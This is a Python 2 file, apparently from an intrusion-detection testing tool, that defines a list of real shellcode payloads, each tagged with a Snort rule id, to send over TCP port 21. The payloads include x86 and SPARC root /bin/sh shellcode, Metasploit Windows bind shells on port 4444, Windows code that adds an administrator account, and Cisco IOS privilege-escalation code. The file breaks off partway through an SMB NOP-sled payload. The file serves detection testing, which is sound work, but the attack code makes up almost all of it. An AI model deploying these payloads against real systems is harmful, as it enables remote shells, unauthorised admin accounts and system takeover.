#!/usr/bin/env python
###
# @author $Author: sebastiendamaye $
# @version $Revision: 11 $
# @lastmodified $Date: 2011-05-26 17:02:06 +0200 (Thu, 26 May 2011) $
#

"""
These shellcodes have been extracted from the OSSIM distribution
This script is inspired from the one written by Jaime Blasco
(jaime.blasco #at# alienvault #dot# com)
"""

import ConfigParser

class ShellCodes():
    def __init__(self, target, cnf):
        # Read configuration
        self.config = ConfigParser.RawConfigParser()
        self.config.read(cnf)

        self._target = target
        self.payloads = []

    def getPayloads(self):

        ### SHELLCODE ** sparc setuid 0
        shellcode =  "\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"
        shellcode += "\xaa\x1d\x40\x15\x90\x05\x60\x01\x92\x10\x20\x09"
        shellcode += "\x94\x05\x60\x02\x82\x10\x20\x3e\x91\xd0\x20\x08"
        shellcode += "\x20\x80\x49\x73\x20\x80\x62\x61\x20\x80\x73\x65\x20\x80\x3a\x29"
        shellcode += "\x7f\xff\xff\xff\x94\x1a\x80\x0a\x90\x03\xe0\x34\x92\x0b\x80\x0e"
        shellcode += "\x9c\x03\xa0\x08\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\xc0\x2a\x20\x07"
        shellcode += "\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
        shellcode += "\x91\xd0\x20\x08\x2f\x62\x69\x6e\x2f\x73\x68\xff"
        self.payloads.append([
            "SHELLCODE ** sparc setuid 0",
            "socket",
            21,
            "tcp",
            shellcode,
            "1:647:9"
            ])

        #SHELLCODE x86 setgid
        shellcode =     "\x33\xDB\x33\xC0\xB0\x1B\xCD\x80" # alarm(0);
        #shellcode +=   "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" # setuid(0);
        shellcode +=    "\x31\xc0\x50\x50\xb0\xb5\xcd\x80" # setgid(0);
        shellcode +=    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        shellcode +=    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        shellcode +=    "\x80\xe8\xdc\xff\xff\xff/bin/sh";
        self.payloads.append([
            "SHELLCODE x86 setgid",
            "socket",
            21,
            "tcp",
            shellcode,
            "1:649:10"
            ])

        #SHELLCODE IRIX SGI + NOOP
        shellcode =     "\x30\x0b\xff\xff"    #/* andi    $t3,$zero,0xffff     */
        shellcode +=       "\x24\x02\x04\x01"    #/* li      $v0,1024+1           */
        shellcode +=       "\x20\x42\xff\xff"    #/* addi    $v0,$v0,-1           */
        shellcode +=        "\x03\xff\xff\xcc"    #/* syscall                      */
        shellcode +=        "\x30\x44\xff\xff"    #/* andi    $a0,$v0,0xffff       */
        shellcode +=        "\x31\x65\xff\xff"    #/* andi    $a1,$t3,0xffff       */
        shellcode +=        "\x24\x02\x04\x64"  #  /* li      $v0,1124             */
        shellcode +=        "\x03\xff\xff\xcc"    #/* syscall                      */
        shellcode +=      "\x24\x0f\x12\x34"    #NOOP
        self.payloads.append([
            "SHELLCODE IRIX SGI + NOOP",
            "socket",
            21,
            "tcp",
            shellcode,
            ""
            ])

        # SHELLCODE x86 setgid 0 && SHELLCODE x86 setuid 0
        shellcode =     "\x33\xDB\x33\xC0\xB0\x1B\xCD\x80" # alarm(0);
        shellcode +=   "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" # setuid(0);
        shellcode +=    "\x31\xc0\x50\x50\xb0\xb5\xcd\x80" # setgid(0);
        shellcode +=    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        shellcode +=    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        shellcode +=    "\x80\xe8\xdc\xff\xff\xff/bin/sh";
        self.payloads.append([
            "SHELLCODE x86 setgid 0 && SHELLCODE x86 setuid 0",
            "socket",
            21,
            "tcp",
            shellcode,
            "1:650:10"
            ])

        #OVERFLOW attempt
        overflow = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        self.payloads.append([
            "OVERFLOW attempt",
            "socket",
            21,
            "tcp",
            overflow,
            "(?i)overflow"
            ])

        #SHELLCODE x86 setuid 0
        shellcode =     "\x33\xDB\x33\xC0\xB0\x1B\xCD\x80" # alarm(0);
        shellcode +=   "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" # setuid(0);
        #shellcode +=    "\x31\xc0\x50\x50\xb0\xb5\xcd\x80" # setgid(0);
        shellcode +=    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        shellcode +=    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        shellcode +=    "\x80\xe8\xdc\xff\xff\xff/bin/sh";
        self.payloads.append([
            "SHELLCODE x86 setuid 0",
            "socket",
            21,
            "tcp",
            shellcode,
            "1:650:10"
            ])

        # win32_bind_dllinject - EXITFUNC=seh DLL=c:\ LPORT=4444 Size=312 Encoder=PexFnstenvSub
        # http://metasploit.com
        shellcode = "\x29\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x82"
        shellcode += "\xb4\x26\x16\x83\xeb\xfc\xe2\xf4\x6a\xe2\x26\x16\x82\xe7\x73\x40"
        shellcode += "\xd5\x3f\x4a\x32\x9a\x3f\x63\x2a\x09\xe0\x23\x6e\x83\x5e\xad\x5c"
        shellcode += "\x9a\x3f\x7c\x36\x83\x5f\xc5\x24\xcb\x3f\x12\x9d\x83\x5a\x17\xe9"
        shellcode += "\x7e\x85\xe6\xba\xba\x54\x52\x11\x43\x7b\x2b\x17\x45\x5f\xd4\x2d"
        shellcode += "\xfe\x90\x32\x63\x63\x3f\x7c\x32\x83\x5f\x40\x9d\x8e\xff\xad\x4c"
        shellcode += "\x9e\xb5\xcd\x9d\x86\x3f\x27\xfe\x69\xb6\x17\xd6\xdd\xea\x7b\x4d"
        shellcode += "\x40\xbc\x26\x48\xe8\x84\x7f\x72\x09\xad\xad\x4d\x8e\x3f\x7d\x0a"
        shellcode += "\x09\xaf\xad\x4d\x8a\xe7\x4e\x98\xcc\xba\xca\xe9\x54\x3d\xe1\x97"
        shellcode += "\x6e\xb4\x27\x16\x82\xe3\x70\x45\x0b\x51\xce\x31\x82\xb4\x26\x86"
        shellcode += "\x83\xb4\x26\xa0\x9b\xac\xc1\xb2\x9b\xc4\xcf\xf3\xcb\x32\x6f\xb2"
        shellcode += "\x98\xc4\xe1\xb2\x2f\x9a\xcf\xcf\x8b\x41\x8b\xdd\x6f\x48\x1d\x41"
        shellcode += "\xd1\x86\x79\x25\xb0\xb4\x7d\x9b\xc9\x94\x77\xe9\x55\x3d\xf9\x9f"
        shellcode += "\x41\x39\x53\x02\xe8\xb3\x7f\x47\xd1\x4b\x12\x99\x7d\xe1\x22\x4f"
        shellcode += "\x0b\xb0\xa8\xf4\x70\x9f\x01\x42\x7d\x83\xd9\x43\xb2\x85\xe6\x46"
        shellcode += "\xd2\xe4\x76\x56\xd2\xf4\x76\xe9\xd7\x98\xaf\xd1\xb3\x6f\x75\x45"
        shellcode += "\xea\xb6\x26\x07\xde\x3d\xc6\x7c\x92\xe4\x71\xe9\xd7\x90\x75\x41"
        shellcode += "\x7d\xe1\x0e\x45\xd6\xe3\xd9\x43\xa2\x3d\xe1\x97\x6e\xb4\x36\x16"
        shellcode += "\x82\x3d\xc5\x7c\x82\xdc\x26\x06\x82\xb4\x75\x41\x7d\xe1\x3e\x97"
        shellcode += "\x6e\xb4\x22\x16\x82\x4b\xf5\x16"
        self.payloads.append([
            """win32_bind_dllinject - EXITFUNC=seh DLL=c:\ LPORT=4444 Size=312 Encoder=PexFnstenvSub""",
            "socket",
            21,
            "tcp",
            shellcode,
            "1:17322:1"
            ])

        #win32_bind_dllinject -  EXITFUNC=seh DLL=c:\ LPORT=4444 Size=312 Encoder=Pex
        shellcode = "\x2b\xc9\x83\xe9\xb8\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xfb"
        shellcode += "\x77\x35\xe3\x83\xee\xfc\xe2\xf4\x13\x21\x35\xe3\xfb\x24\x60\xb5"
        shellcode += "\xac\xfc\x59\xc7\xe3\xfc\x70\xdf\x70\x23\x30\x9b\xfa\x9d\xbe\xa9"
        shellcode += "\xe3\xfc\x6f\xc3\xfa\x9c\xd6\xd1\xb2\xfc\x01\x68\xfa\x99\x04\x1c"
        shellcode += "\x07\x46\xf5\x4f\xc3\x97\x41\xe4\x3a\xb8\x38\xe2\x3c\x9c\xc7\xd8"
        shellcode += "\x87\x53\x21\x96\x1a\xfc\x6f\xc7\xfa\x9c\x53\x68\xf7\x3c\xbe\xb9"
        shellcode += "\xe7\x76\xde\x68\xff\xfc\x34\x0b\x10\x75\x04\x23\xa4\x29\x68\xb8"
        shellcode += "\x39\x7f\x35\xbd\x91\x47\x6c\x87\x70\x6e\xbe\xb8\xf7\xfc\x6e\xff"
        shellcode += "\x70\x6c\xbe\xb8\xf3\x24\x5d\x6d\xb5\x79\xd9\x1c\x2d\xfe\xf2\x62"
        shellcode += "\x17\x77\x34\xe3\xfb\x20\x63\xb0\x72\x92\xdd\xc4\xfb\x77\x35\x73"
        shellcode += "\xfa\x77\x35\x55\xe2\x6f\xd2\x47\xe2\x07\xdc\x06\xb2\xf1\x7c\x47"
        shellcode += "\xe1\x07\xf2\x47\x56\x59\xdc\x3a\xf2\x82\x98\x28\x16\x8b\x0e\xb4"
        shellcode += "\xa8\x45\x6a\xd0\xc9\x77\x6e\x6e\xb0\x57\x64\x1c\x2c\xfe\xea\x6a"
        shellcode += "\x38\xfa\x40\xf7\x91\x70\x6c\xb2\xa8\x88\x01\x6c\x04\x22\x31\xba"
        shellcode += "\x72\x73\xbb\x01\x09\x5c\x12\xb7\x04\x40\xca\xb6\xcb\x46\xf5\xb3"
        shellcode += "\xab\x27\x65\xa3\xab\x37\x65\x1c\xae\x5b\xbc\x24\xca\xac\x66\xb0"
        shellcode += "\x93\x75\x35\xf2\xa7\xfe\xd5\x89\xeb\x27\x62\x1c\xae\x53\x66\xb4"
        shellcode += "\x04\x22\x1d\xb0\xaf\x20\xca\xb6\xdb\xfe\xf2\x62\x17\x77\x25\xe3"
        shellcode += "\xfb\xfe\xd6\x89\xfb\x1f\x35\xf3\xfb\x77\x66\xb4\x04\x22\x2d\x62"
        shellcode += "\x17\x77\x31\xe3\xfb\x88\xe6\xe3"
        self.payloads.append([
            """win32_bind_dllinject - EXITFUNC=seh DLL=c:\ LPORT=4444 Size=312 Encoder=Pex""",
            "socket",
            21,
            "tcp",
            shellcode,
            "1:17344:1"
            ])

        # win32_bind -  EXITFUNC=seh LPORT=4444 Size=709 Encoder=PexAlphaNum
        shellcode = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
        shellcode += "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
        shellcode += "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
        shellcode += "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
        shellcode += "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x46\x4b\x4e"
        shellcode += "\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x36\x4b\x48"
        shellcode += "\x4e\x56\x46\x52\x46\x52\x4b\x38\x45\x54\x4e\x53\x4b\x58\x4e\x37"
        shellcode += "\x45\x50\x4a\x37\x41\x50\x4f\x4e\x4b\x48\x4f\x44\x4a\x41\x4b\x58"
        shellcode += "\x4f\x45\x42\x52\x41\x30\x4b\x4e\x49\x34\x4b\x58\x46\x43\x4b\x38"
        shellcode += "\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x38\x42\x4c"
        shellcode += "\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
        shellcode += "\x46\x4f\x4b\x33\x46\x55\x46\x32\x4a\x32\x45\x47\x45\x4e\x4b\x58"
        shellcode += "\x4f\x45\x46\x42\x41\x50\x4b\x4e\x48\x56\x4b\x48\x4e\x50\x4b\x44"
        shellcode += "\x4b\x48\x4f\x55\x4e\x51\x41\x30\x4b\x4e\x43\x50\x4e\x42\x4b\x58"
        shellcode += "\x49\x48\x4e\x56\x46\x52\x4e\x31\x41\x46\x43\x4c\x41\x33\x4b\x4d"
        shellcode += "\x46\x46\x4b\x48\x43\x54\x42\x33\x4b\x58\x42\x34\x4e\x50\x4b\x58"
        shellcode += "\x42\x37\x4e\x41\x4d\x4a\x4b\x58\x42\x44\x4a\x50\x50\x55\x4a\x36"
        shellcode += "\x50\x48\x50\x34\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x46"
        shellcode += "\x43\x55\x48\x36\x4a\x36\x43\x43\x44\x33\x4a\x46\x47\x57\x43\x47"
        shellcode += "\x44\x33\x4f\x55\x46\x35\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
        shellcode += "\x4e\x4f\x4b\x43\x42\x55\x4f\x4f\x48\x4d\x4f\x45\x49\x38\x45\x4e"
        shellcode += "\x48\x56\x41\x48\x4d\x4e\x4a\x30\x44\x50\x45\x35\x4c\x36\x44\x30"
        shellcode += "\x4f\x4f\x42\x4d\x4a\x36\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x55"
        shellcode += "\x4f\x4f\x48\x4d\x43\x45\x43\x55\x43\x55\x43\x35\x43\x35\x43\x34"
        shellcode += "\x43\x55\x43\x34\x43\x45\x4f\x4f\x42\x4d\x48\x46\x4a\x46\x41\x41"
        shellcode += "\x4e\x35\x48\x46\x43\x35\x49\x38\x41\x4e\x45\x59\x4a\x56\x46\x4a"
        shellcode += "\x4c\x31\x42\x37\x47\x4c\x47\x35\x4f\x4f\x48\x4d\x4c\x56\x42\x51"
        shellcode += "\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x56\x46\x4a\x4d\x4a\x50\x52"
        shellcode += "\x49\x4e\x47\x55\x4f\x4f\x48\x4d\x43\x55\x45\x45\x4f\x4f\x42\x4d"
        shellcode += "\x4a\x36\x45\x4e\x49\x44\x48\x48\x49\x54\x47\x55\x4f\x4f\x48\x4d"
        shellcode += "\x42\x45\x46\x45\x46\x45\x45\x35\x4f\x4f\x42\x4d\x43\x39\x4a\x46"
        shellcode += "\x47\x4e\x49\x37\x48\x4c\x49\x47\x47\x35\x4f\x4f\x48\x4d\x45\x35"
        shellcode += "\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x46\x48\x46\x4a\x36\x43\x46"
        shellcode += "\x4d\x46\x49\x48\x45\x4e\x4c\x36\x42\x55\x49\x35\x49\x52\x4e\x4c"
        shellcode += "\x49\x58\x47\x4e\x4c\x46\x46\x54\x49\x48\x44\x4e\x41\x53\x42\x4c"
        shellcode += "\x43\x4f\x4c\x4a\x50\x4f\x44\x34\x4d\x42\x50\x4f\x44\x54\x4e\x32"
        shellcode += "\x43\x39\x4d\x38\x4c\x37\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
        shellcode += "\x44\x37\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x47\x46\x44\x4f\x4f"
        shellcode += "\x48\x4d\x4b\x35\x47\x55\x44\x35\x41\x45\x41\x55\x41\x45\x4c\x36"
        shellcode += "\x41\x30\x41\x45\x41\x55\x45\x35\x41\x35\x4f\x4f\x42\x4d\x4a\x46"
        shellcode += "\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x46"
        shellcode += "\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x38\x47\x45\x4e\x4f"
        shellcode += "\x43\x38\x46\x4c\x46\x46\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
        shellcode += "\x4a\x56\x42\x4f\x4c\x38\x46\x30\x4f\x35\x43\x55\x4f\x4f\x48\x4d"
        shellcode += "\x4f\x4f\x42\x4d\x5a"
        self.payloads.append([
            """win32_bind - EXITFUNC=seh LPORT=4444 Size=709 Encoder=PexAlphaNum""",
            "socket",
            21,
            "tcp",
            shellcode,
            "1:17325:1"
            ])

        #db "cmd.exe /c net user USERNAME PASSWORD /ADD && net localgroup Administrators /ADD USERNAMEN"
        shellcode = "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x59\x53\xbb\x35\xfd\xe6\x77"
        shellcode += "\xff\xd3\x31\xc0\x50\xbb\xfd\x98\xe7\x77\xff\xd3\xe8\xe0\xff\xff\xff"
        shellcode += "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73"
        shellcode += "\x65\x72\x20\x55\x53\x45\x52\x4e\x41\x4d\x45\x20\x50\x41\x53\x53\x57"
        shellcode += "\x4f\x52\x44\x20\x2f\x41\x44\x44\x20\x26\x26\x20\x6e\x65\x74\x20\x6c"
        shellcode += "\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73"
        shellcode += "\x74\x72\x61\x74\x6f\x72\x73\x20\x2f\x41\x44\x44\x20\x55\x53\x45\x52"
        shellcode += "\x4e\x41\x4d\x45\x4e"
        self.payloads.append([
            """db "cmd.exe /c net user USERNAME PASSWORD /ADD && net localgroup Administrators /ADD USERNAMEN" """,
            "socket",
            21,
            "tcp",
            shellcode,
            ""
            ])


        #Cisco: Creates a new VTY, allocates a password then sets the privilege level to 15
        shellcode = "\x3c\x80\x81\x83"      # lis     4,vty_info@ha
        shellcode += "\x38\x84\xda\x60"      # la      4,vty_info@l(4)
        shellcode += "\x7d\x08\x42\x78"      # xor     8,8,8
        shellcode += "\x7c\xe4\x40\x2e"      # lwzx    7,4,8
        shellcode += "\x91\x07\x01\x74"      # stw     8,372(7)
        shellcode += "\x39\x08\xff\xff"      # subi    8,8,1
        shellcode += "\x38\xe7\x09\x1a"      # addi    7,7,233
        shellcode += "\x91\x07\x04\xca"      # stw     8,1226(7)
        shellcode += "\x7d\x03\x43\x78"      # mr      3,8
        shellcode += "\x3c\x80\x80\xe4"      # lis     4,terminate@ha
        shellcode += "\x38\x84\x08\x6c"      # la      4,terminate@l(4)
        shellcode += "\x7c\x89\x03\xa6"      # mtctr   4
        shellcode += "\x4e\x80\x04\x20"      # bctr
        # exits cleanly without adversely affecting the FTP server
        shellcode += "\x61\x61\x61\x61"      # padding
        shellcode += "\x61\x61\x61\x61"      # padding
        shellcode += "\x61\x61\x61\x61"      # padding
        shellcode += "\x61\x61\x61\x61"      # padding
        shellcode += "\x61\x61\x61\x61"      # padding
        shellcode += "\x61\x61\x61\x61"      # padding
        shellcode += "\x80\x06\x23\xB8"      # return address
        shellcode += "\x0d\x0a"
        self.payloads.append([
            "Cisco: Creates a new VTY, allocates a password then sets the privilege level to 15",
            "socket",
            21,
            "tcp",
            shellcode,
            ""
            ])

        #ET ATTACK_RESPONSE Rothenburg Shellcode
        shellcode = "\x29\xC9\x83\xE9\xB8\xD9\xEE\xD9\x74\x24\xF4\x5B\x81\x73\x13\x82\xB4\x26\x16\x83\xEB\xFC\xE2\xF4\x6A\xE2\x26\x16\x82\xE7\x73\x40\xD5\x3F\x4A\x32\x9A\x3F\x63\x2A\x09\xE0\x23\x6E\x83\x5E\xAD\x5C\x9A\x3F\x7C\x36\x83\x5F\xC5\x24\xCB\x3F\x12\x9D\x83\x5A\x17\xE9\x7E\x85\xE6\xBA\xBA\x54\x52\x11\x43\x7B\x2B\x17\x45\x5F\xD4\x2D\xFE\x90\x32\x63\x63\x3F\x7C\x32\x83\x5F\x40\x9D\x8E\xFF\xAD\x4C\x9E\xB5\xCD\x9D\x86\x3F\x27\xFE\x69\xB6\x17\xD6\xDD\xEA\x7B\x4D\x40\xBC\x26\x48\xE8\x84\x7F\x72\x09\xAD\xAD\x4D\x8E\x3F\x7D\x0A\x09\xAF\xAD\x4D\x8A\xE7\x4E\x98\xCC\xBA\xCA\xE9\x54\x3D\xE1\x97\x6E\xB4\x27\x16\x82\xE3\x70\x45\x0B\x51\xCE\x31\x82\xB4\x26\x86\x83\xB4\x26\xA0\x9B\xAC\xC1\xB2\x9B\xC4\xCF\xF3\xCB\x32\x6F\xB2\x98\xC4\xE1\xB2\x2F\x9A\xCF\xCF\x8B\x41\x8B\xDD\x6F\x48\x1D\x41\xD1\x86\x79\x25\xB0\xB4\x7D\x9B\xC9\x94\x77\xE9\x55\x3D\xF9\x9F\x41\x39\x53\x02\xE8\xB3\x7F\x47\xD1\x4B\x12\x99\x7D\xE1\x22\x4F\x0B\xB0\xA8\xF4\x70\x9F\x01\x42\x7D\x83\xD9\x43\xB2\x85\xE6\x46\xD2\xE4\x76\x56\xD2\xF4\x76\xE9\xD7\x98\xAF\xD1\xB3\x6F\x75\x45\xEA\xB6\x26\x07\xDE\x3D\xC6\x7C\x92\xE4\x71\xE9\xD7\x90\x75\x41\x7D\xE1\x0E\x45\xD6\xE3\xD9\x43\xA2\x3D\xE1\x97\x6E\xB4\x36\x16\x82\x3D\xC5\x7C\x82\xDC\x26\x06\x82\xB4\x75\x41\x7D\xE1\x3E\x97\x6E\xB4\x22\x16\x82\x4B\xF5\x16"
        self.payloads.append([
            "Rothenburg Shellcode",
            "socket",
            21,
            "tcp",
            shellcode,
            "1:17322:1"
            ])

        #Mainz/Bielefeld Shellcode
        shellcode = "\x00\x00\x0C\xF4\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04\x00\x08\x60\x00\x10\x00\x00\xA0\x0C\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\xA0\x0C\x54\x00\x02\x00\x26\x00\x00\x40\xB1\x0C\x10\x5C\x00\x50\x00\x49\x00\x50\x00\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x00\x03\x10\x00\x00\x00\xA0\x0C\x00\x00\x01\x00\x00\x00\x88\x0C\x00\x00\x00\x00\x09\x00\xEC\x03\x00\x00\x00\x00\x00\x00\xEC\x03\x00\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x7D\x01\x80\x34\x0A\x99\xE2\xFA\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x95\x98\x99\x99\xC3\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x12\xED\x87\xE1\x9A\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0\x71\x1E\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41\xF3\x9C\xC0\x71\xED\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66\xCE\x75\x12\x41\x5E\x9E\x9B\x99\x9E\x3C\xAA\x59\x10\xDE\x9D\xF3\x89\xCE\xCA\x66\xCE\x69\xF3\x98\xCA\x66\xCE\x6D\xC9\xC9\xCA\x66\xCE\x61\x12\x49\x1A\x75\xDD\x12\x6D\xAA\x59\xF3\x89\xC0\x10\x9D\x17\x7B\x62\x10\xCF\xA1\x10\xCF\xA5\x10\xCF\xD9\xFF\x5E\xDF\xB5\x98\x98\x14\xDE\x89\xC9\xCF\xAA\x50\xC8\xC8\xC8\xF3\x98\xC8\xC8\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xC8\x66\xCE\x79\xCB\x66\xCE\x65\xCA\x66\xCE\x65\xC9\x66\xCE\x7D\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59\x5A\x71\x76\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xCD\xF1\xEB\xFC\xF8\xFD\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC\xED\xD8\x99\xFB\xF0\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED\x99\xFA\xF5\xF6\xEA\xFC\xEA\xF6\xFA\xF2\xFC\xED"
        shellcode += "\x99\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x